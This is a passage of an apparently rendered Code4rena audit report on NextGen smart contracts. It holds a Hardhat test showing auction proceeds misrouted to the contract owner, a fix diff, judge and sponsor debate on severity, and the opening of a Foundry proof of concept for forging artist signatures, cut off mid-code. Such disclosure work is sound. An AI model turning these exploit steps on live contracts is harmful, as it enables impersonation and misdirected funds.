class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">20</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nextGenOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintAndAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenOwner</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;Test Auction 1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">id1</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10000000000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionDemo</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">id1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Winning auction bid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionDemo</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\">).</span><span class=\"mtk11\">participateToAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id1</span><span class=\"mtk1\">, { </span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;2&#39;</span><span class=\"mtk1\">) });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Move past auction end time and claim token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_setNextBlockTimestamp&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">101</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transaction</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">auctionDemo</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\">).</span><span class=\"mtk11\">claimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// get owner of auditDemo contract and make sure it&#39;s not the token owner for this usecase</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionDemo</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nextGenOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenOwner</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// NextGen owner receives proceeds, token owner receives nothing.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(() </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transaction</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">changeEtherBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nextGenOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;2&#39;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(() </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transaction</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">changeEtherBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenOwner</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id1</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<h3 id=\"recommendations\" style=\"position:relative;\"><a href=\"#recommendations\" aria-label=\"recommendations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendations</h3>\n<p>Send the auction proceeds to <code>ownerOfToken</code> instead of <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/AuctionDemo.sol#L113\">owner</a>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/AuctionDemo.sol#L113-L114\">AuctionDemo L113-L114</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -110,8 +110,8 @@ contract auctionDemo is Ownable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">for (uint256 i=0; i&lt; auctionInfoData[_tokenid].length; i ++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (auctionInfoData[_tokenid][i].bidder == highestBidder &amp;&amp; auctionInfoData[_tokenid][i].bid == highestBid &amp;&amp; 112| auctionInfoData[_tokenid][i].status == true) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       (bool success, ) = payable(owner()).call{value: highestBid}(&quot;&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       emit ClaimAuction(owner(), _tokenid, success, highestBid);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       (bool success, ) = payable(ownerOfToken).call{value: highestBid}(&quot;&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       emit ClaimAuction(ownerOfToken, _tokenid, success, highestBid);</span></span></span></code></pre>\n<h3 id=\"assessed-type-7\" style=\"position:relative;\"><a href=\"#assessed-type-7\" aria-label=\"assessed type 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>ETH-Transfer</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/245#issuecomment-1822700002\">a2rocket (NextGen) confirmed and commented via duplicate issue #245</a>:</strong></p>\n<blockquote>\n<p>The <code>mintAndAuction</code> function can only be called by trusted parties. The <code>_recipient</code> of that function will be a trusted wallet that will also call <code>setApprovalForAll()</code> from the Core contract for the Auction Contract. In our case, the <code>_recipient</code> will be the deployer of the Auction contract; at the end of the day, the token owner and auction owner are the same person.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/971#issuecomment-1847923059\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>After re-visiting, I consider this submission to be better than <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/738\">#738</a> because it also correctly specifies that the <code>event</code> should be fixed rather than just the statement. While I cannot penalize submissions for not including the <code>event</code> in their proposed remediations, I can mark a submission that cites it and is of equivalent quality as â€œbestâ€.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/971#issuecomment-1848601608\">MrPotatoMagic (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xsomeone, here is why I believe this issue is QA at most:</p>\n<ol>\n<li>As per the sponsors comments <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/245#issuecomment-1822700002\">here</a>, the owner of the auction contract and the owner of the token are trusted teamâ€™s address. This means that whether the funds are sent to either, they are not lost, just that the team needs to make an additional fund transfer on their end (if needed).</li>\n<li>Although the invariant is broken, it has no impact on the functioning of the protocol.\nDue to this, I believe the severity should be QA at most.</li>\n</ol>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/971#issuecomment-1848645800\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@MrPotatoMagic, thanks for contributing! The code goes against its specification and breaks an invariant of the protocol. Regardless of severity, an invariant being broken will always be considered a medium-risk issue given that it relates to pivotal functionality in the system being incorrect.</p>\n<p>In this case, funds are sent to a NextGen address rather than a collection-affiliated address or secondary smart contract meant to facilitate fund disbursements. This has implications tax-wise, implications about trust (i.e. if a 10m auction is held, the stakes of trust are increased significantly), and other such problems. Logistically, it is also a heavy burden to manage multiple auction payments at once, prove which source sent which, and so on.</p>\n<p>Combining the above with the fact that <strong>a clear invariant of the protocol is broken</strong>, I will maintain the medium-risk rating.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-artist-signatures-can-be-forged-to-impersonate-the-artist-behind-a-collection\" style=\"position:relative;\"><a href=\"#m-06-artist-signatures-can-be-forged-to-impersonate-the-artist-behind-a-collection\" aria-label=\"m 06 artist signatures can be forged to impersonate the artist behind a collection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/741\">[M-06] Artist signatures can be forged to impersonate the artist behind a collection</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/741\">The_Kakers</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1752\">mrudenko</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1055\">alexfilippov314</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/986\">xuwinnie</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/408\">xAriextz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/159\">Draiakoo</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1972\">Stryder</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1676\">0xblackskull</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/855\">VAD37</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/771\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/562\">BugzyVonBuggernaut</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/478\">zach</a></em></p>\n<p>Artist signatures can be forged, making it possible to sign any message, while â€œprovingâ€ that it was signed by any address.</p>\n<p>This can be done to impersonate any address from any artist, breaking a core protocol functionality, and losing usersâ€™ trust. The signature canâ€™t be deleted by anyone, nor the artist address, once the collection is signed.</p>\n<p>This also breaks one of the <a href=\"https://github.com/code-423n4/2023-10-nextgen/tree/main#main-invariants\">main invariants of the protocol</a>:</p>\n<blockquote>\n<p>Properties that should NEVER be broken under any circumstance:</p>\n<ul>\n<li>Only artists can sign their collections.</li>\n</ul>\n</blockquote>\n<p>Evaluated as Medium since it breaks a core contract functionality, and a main invariant, regardless of trusted roles. As any collection admin can impersonate any legit address, which should be consider a way to â€œescalate their authority beyond their roleâ€ <a href=\"https://github.com/code-423n4/2023-10-nextgen/tree/main#attack-ideas-where-to-look-for-bugs\">as mentioned on the Access Control and Permissions Attack Ideas</a>.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>setCollectionData()</code> allows to set the artist address when the current <code>collectionTotalSupply == 0</code>:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L149\">NextGenCore.sol#L149</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L150\">NextGenCore.sol#L150</a></li>\n</ul>\n<p>The problem is that it doesnâ€™t check that the param <code>collectionTotalSupply</code> passed is <code>!= 0</code>. Meaning that the function can be executed multiple times to change the artist address, as long as the total supply is zero:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L148\">NextGenCore.sol#L148</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L153\">NextGenCore.sol#L153</a></li>\n</ul>\n<p>So, it can be called first to set a fake artist address to call <code>artistSignature()</code> to sign the collection:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L257\">NextGenCore.sol#L257</a></li>\n</ul>\n<p>And then call <code>setCollectionData()</code> again to set the legit artist address.</p>\n<p>Once the signature is set, it canâ€™t be changed, nor the artist address, as it will always fall under the <code>else</code> clause:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L162\">NextGenCore.sol#L162</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L258\">NextGenCore.sol#L258</a></li>\n</ul>\n<p>The following coded POC shows how it can be done.</p>\n<h3 id=\"coded-proof-of-concept\" style=\"position:relative;\"><a href=\"#coded-proof-of-concept\" aria-label=\"coded proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Coded Proof of Concept</h3>\n<ol>\n<li>Run <code>forge init --no-git --force</code> to initiate Foundry on the root of the project.</li>\n<li>Create <code>test/Poc.t.sol</code> and copy the snippet below.</li>\n<li>Run <code>forge test</code>.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: UNLICENSED</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">Test</span><span class=\"mtk1\">, </span><span class=\"mtk12\">console2</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">NextGenAdmins</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;smart-contracts/NextGenAdmins.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">NextGenCore</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;smart-contracts/NextGenCore.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">AuctionTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">NextGenAdmins</span><span class=\"mtk1\"> </span><span class=\"mtk12\">admin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">NextGenCore</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionAdmin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">admin</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NextGenAdmins</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NextGenCore</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;core&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;core&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionScript</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createCollection</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Artist&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Description&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Website&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;License&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;https://base-uri.com/&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;Library&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Script&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionId</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collectionAdmin</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;collectionAdmin&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">admin</span><span class=\"mtk1\">.</span><span class=\"mtk11\">registerCollectionAdmin</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collectionAdmin</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testArtistSignature</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span 